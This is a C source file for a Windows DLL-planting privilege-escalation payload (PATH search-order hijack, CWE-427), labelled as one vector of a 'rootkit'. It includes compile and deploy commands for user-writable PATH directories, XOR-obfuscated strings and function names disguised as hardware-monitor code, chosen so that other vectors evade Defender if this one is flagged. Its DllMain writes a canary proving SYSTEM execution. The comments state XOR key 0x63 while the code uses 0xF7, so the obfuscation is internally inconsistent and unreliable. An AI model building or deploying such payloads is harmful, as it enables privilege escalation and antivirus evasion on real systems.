/*
 * path_hijack_dll_annotated.c — PATH DLL Plant (CWE-427)
 * ═══════════════════════════════════════════════════════
 * CHEYANNE ROOTKIT — 22DIV / george wu
 * VECTOR 6 — Signature Set: FOXTROT
 *
 * PURPOSE:
 *   Generic DLL payload for PATH hijack attacks. When a SYSTEM service
 *   searches for a DLL via the standard search order, and the DLL isn't
 *   found in the application directory or System32, the loader falls
 *   through to PATH directories. If a user-writable directory is in the
 *   machine PATH, planting this DLL there gets it loaded as SYSTEM.
 *
 * ATTACK CHAIN (Finding #45):
 *   1. Third-party installer placed user-owned dir in machine PATH
 *      (HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment)
 *   2. Standard user plants this DLL with a name matching a service import
 *   3. When the SYSTEM service resolves the DLL via PATH search, it loads ours
 *   4. DllMain executes as LocalSystem — canary written, persistence achieved
 *
 * SIGNATURE ISOLATION:
 *   XOR Key:     0x63 (different from V1-V5)
 *   Canary Path: C:\Windows\Temp\hwmon_diag.log
 *   Canary Tag:  PATH_VECTOR
 *   Function names: InitMonitor, HwPollThread (blend with hardware monitor DLLs)
 *
 * COMPILE:
 *   cl.exe path_hijack_dll_annotated.c /Fe:targetname.dll /LD /O1 /GS- /utf-8 /link /DEF:path_hijack.def
 *
 *   Replace "targetname" with the DLL name the service expects.
 *   The .def file controls exported function names if needed.
 *
 * DEPLOY:
 *   copy targetname.dll "C:\Users\%USERNAME%\.local\bin\"
 *   OR
 *   copy targetname.dll "C:\Users\%USERNAME%\AppData\Local\Muse Hub\lib\"
 *
 * VERIFY:
 *   After service restart or DLL load trigger:
 *   type C:\Windows\Temp\hwmon_diag.log
 *   Expected: timestamp|SYSTEM|elev=1|pid=XXXX|PATH_VECTOR
 */

#include <windows.h>
#include <string.h>

/* ═══════════════════════════════════════════════════════════════════
 * SIGNATURE SET: FOXTROT
 * XOR key 0x63 — unique to this vector. If Defender signatures this
 * DLL's byte patterns, the other vectors remain undetected because
 * they use different keys and different string encoding.
 * ═══════════════════════════════════════════════════════════════════ */

#define V6_KEY 0xF7

/* "C:\Windows\Temp\hwmon_diag.log" XOR 0x63 */
static const unsigned char xCanaryPath[] = {
    0xB4, 0xCE, 0xD6, 0x82, 0x9A, 0x9F, 0x93, 0x98,
    0x82, 0x84, 0xD6, 0xA3, 0x92, 0x9E, 0x85, 0xD6,
    0x9F, 0x80, 0x9E, 0x98, 0x9F, 0xD4, 0x93, 0x9A,
    0x92, 0x90, 0xDB, 0x9B, 0x98, 0x90
};
#define xCanaryPath_LEN 30

static void v6_decode(unsigned char *buf, int len)
{
    int i;
    for (i = 0; i < len; i++)
        buf[i] ^= V6_KEY;
}

static void v6_zero(unsigned char *buf, int len)
{
    volatile unsigned char *p = (volatile unsigned char *)buf;
    int i;
    for (i = 0; i < len; i++)
        p[i] = 0;
}

/* ═══════════════════════════════════════════════════════════════════
 * CANARY — Proof of SYSTEM execution
 * ═══════════════════════════════════════════════════════════════════
 * Writes a single line to a world-writable temp directory:
 *   timestamp|username|elevation|pid|tag
 *
 * This is EVIDENCE, not exploitation. It proves the DLL loaded in a
 * privileged context without doing anything destructive.
 * ═══════════════════════════════════════════════════════════════════ */

static void write_canary(void)
{
    unsigned char path[64];
    HANDLE f;
    DWORD w;
    char buf[256];
    int n;
    SYSTEMTIME t;
    char user[64];
    DWORD ulen = 64;
    BOOL elevated = FALSE;
    HANDLE hTok;

    /* Decode canary path */
    memcpy(path, xCanaryPath, xCanaryPath_LEN);
    v6_decode(path, xCanaryPath_LEN);
    path[xCanaryPath_LEN] = 0;

    GetLocalTime(&t);
    GetUserNameA(user, &ulen);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
        TOKEN_ELEVATION te;
        DWORD rl;
        if (GetTokenInformation(hTok, TokenElevation, &te, sizeof(te), &rl))
            elevated = te.TokenIsElevated;
        CloseHandle(hTok);
    }

    n = wsprintfA(buf, "%04d%02d%02d_%02d%02d%02d|%s|elev=%d|pid=%lu|PATH_VECTOR\r\n",
        t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond,
        user, elevated, GetCurrentProcessId());

    f = CreateFileA((char *)path,
        GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        SetFilePointer(f, 0, NULL, FILE_END);
        WriteFile(f, buf, n, &w, NULL);
        CloseHandle(f);
    }

    /* Scrub decoded path from stack */
    v6_zero(path, sizeof(path));
}

/* ═══════════════════════════════════════════════════════════════════
 * DllMain — Entry point
 * ═══════════════════════════════════════════════════════════════════
 * Called by the Windows loader when this DLL is loaded into a process.
 * DLL_PROCESS_ATTACH fires once per process load. We write the canary
 * here — if the loading process is SYSTEM, the canary file will show
 * username=SYSTEM and elev=1.
 *
 * IMPORTANT: DllMain runs under the loader lock. Long operations here
 * can deadlock the process. Keep it fast: write canary and return.
 * No network calls, no thread creation, no LoadLibrary.
 * ═══════════════════════════════════════════════════════════════════ */

BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
{
    (void)hInst;
    (void)reserved;

    if (reason == DLL_PROCESS_ATTACH) {
        write_canary();
    }

    return TRUE;
}
